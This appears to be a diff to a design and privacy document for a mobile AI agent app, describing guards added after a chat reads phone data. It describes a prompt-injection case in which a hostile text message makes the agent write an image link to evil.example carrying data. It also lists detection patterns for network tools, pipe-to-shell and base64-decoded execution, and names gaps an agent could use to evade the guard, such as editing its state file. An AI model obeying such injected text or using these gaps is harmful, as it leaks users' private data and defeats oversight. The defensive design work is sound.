@@ -41,3 +41,82 @@ the switches and approvals protect the `phone_data` tool, but they don't fully s
 - A shell command might read some of this data directly with `content query`. This has not been tested.
 
 **So:** Say this plainly in the privacy doc. Don't describe the gate as stopping everything the agent can do on the phone.
+
+## Chats that have read phone data
+
+**Decided:** 2026-11-04, delegated by the owner to the coordinator, as the option that keeps convenience and safety.
+
+The problem: a hostile text message can tell the agent to write `![](https://evil.example/x.png?d=<rows>)`. After the user
+allows one read, the page loads the image and the data leaves with no tap. A link or a card's `@OpenUrl` does it with one
+tap, and a command such as `curl` can too.
+
+**So, only in chats that have read phone data, for the rest of that chat, and only for actions that can send data out.** A
+chat has read when a `phone_data` tool call exists in it, whatever its outcome. Every other chat behaves exactly as before.
+
+- **The page, in every access mode including Full access.** Remote images, video and audio in the agent's text don't load:
+  a placeholder shows the host name and "Tap to load", and nothing is requested before the tap. Video cards show no
+  thumbnail. Links, inline-code addresses, file chips, links in an HTML preview and a card's `@OpenUrl` show the full address
+  (site, address, and the query on its own) in an in-app dialog and open only on confirmation. Local files and attachments
+  load as always. The state is derived from the chat's items, so it survives a reload or a resume and covers replies already
+  drawn when the read happens. These guards are the part the user sees; they also cover tool cards, notices, the canvas,
+  reasoning and subagent text, card images, Mermaid image shapes and `srcset`.
+- **The native filter is the enforcement.** While the page says the chat on screen has read phone data, the app answers
+  every request the page makes to a host other than `localhost`, `127.0.0.1` or `[::1]` with an empty 403, for every
+  resource type (images, media, scripts, styles, frames, fonts, fetch), whatever the page renders. File, data and blob
+  sources are untouched. It starts each page load blocked and opens only when the page reports an untainted chat. The one
+  thing the user can tap through is "Tap to load" on an image: the app lets that exact address through once, for 60
+  seconds. Video and audio don't load in the page in such a chat: their tap shows the address and opens the browser.
+  While it is on, the page's own web requests (update check, anonymous stats, Report a problem) are refused too and
+  retry later.
+- **The plugin, except in Full access.** The chat is remembered (in memory, and in a small bounded file under
+  `~/.hermes/mobile/`: chat ids only, never data). Its `pre_tool_call` hook then makes Hermes ask the user before terminal
+  commands that match network tools, code that talks to the network, web and browser tools, and message-sending tools. The
+  ask says this chat has read phone data and shows the command; it uses a fresh rule key each time, so no answer carries over.
+  Reading files and other commands run as usual. If the check can't load, those tools are blocked in that chat.
+
+**Limits, stated plainly:**
+
+- The list of network commands is patterns. A disguised command (built from variables, or a script file that makes the call)
+  can slip through. It is a speed bump.
+- In Full access and in Auto access, Hermes's gate approves without asking, so the plugin's ask never shows. Only the
+  page's protection holds there.
+- The agent runs in Termux and can edit the plugin's state file to make a chat look unread.
+- The native filter blocks what the page requests. It does not stop what the agent's own tools send (a terminal command,
+  a web tool): that is the plugin's part, and only a speed bump. It cannot stop the Shizuku routes, and a WebSocket from
+  the page is not covered by it.
+- The filter was compiled and unit-tested (`tools/test_remote_guard.sh`) but not yet run in a real WebView; that needs a
+  phone.
+- A subagent counts as having read phone data on the page only when its own tool event named `phone_data`; one reloaded
+  from history shows no tool names there.
+- Shizuku routes are unchanged (see above).
+
+### Plugin side of the after-read protection
+
+Added 2026-11-04 after an independent review of the first version. The page side above is unchanged.
+
+**Which chat counts as read.** A chat is known by two ids: the gateway's runtime id (new after a gateway restart or a
+resume) and the agent's stored id (kept by a resume, replaced by a context compression). Both are remembered, and when a
+call matches one the other is added, so a restart plus resume, or a compression, keeps the chat marked. One case is not
+covered: both ids changing before any tool call. The state file is locked while it is written, and holds at most 2000
+chats.
+
+**Subagents.** Hermes tells the plugin who spawned whom (`subagent_start` carries the parent's and the child's stored
+ids), and runs a child in a copy of the parent's context, so it shares the runtime id. A child that reads phone data marks
+its parent and grandparents; a child of a chat that has read starts marked. The link is kept in memory only, and a
+subagent started outside the gateway (no runtime id, no hook) is the one gap.
+
+**What asks in a chat that has read.** Terminal commands whose command word is a network tool (including `gh`, `host`,
+`dig`, `nslookup`), `git push`, `clone`, `fetch` and `pull`, a shell fed by a pipe (`| sh`, `| busybox sh`), `bash -c`
+text (read inside), decoded text run as code (`base64 -d` into a shell or interpreter, `bash -c "$(...|base64 -d)"`),
+interpreter one-liners and input from a pipe, `eval`; code that uses the network; the web, browser, message, cron, image,
+video, speech and `delegate_task` tools; `process_manage` `write` and `submit` (they type into a running shell);
+and `memory` and `skill_manage`, whose ask says the text would carry phone data into other chats. The ask names the matched
+pattern first and shows the start and the end of a long command. **What doesn't:** reading files, `grep curl`,
+`git commit -m "...python..."`, `python3 -m pytest`, `cat docs/links.md` and other ordinary commands; `process_manage`
+`poll`, `log`, `wait` and `kill`; `write_file` and `patch`.
+
+**Limits.** The matcher reads command words; it does not run anything. A script file that makes the call, an alias, a
+program that runs a command from inside, or an unusual construction can hide a command. `write_file` into a skill
+directory can also persist text, and is not asked. In Full access and Auto access, Hermes's own gate approves without
+asking, so no ask shows there (accepted). Choosing "Always" on an ask saves a random one-use key that never matches again,
+because Hermes offers no way to switch that choice off; it is harmless but useless.
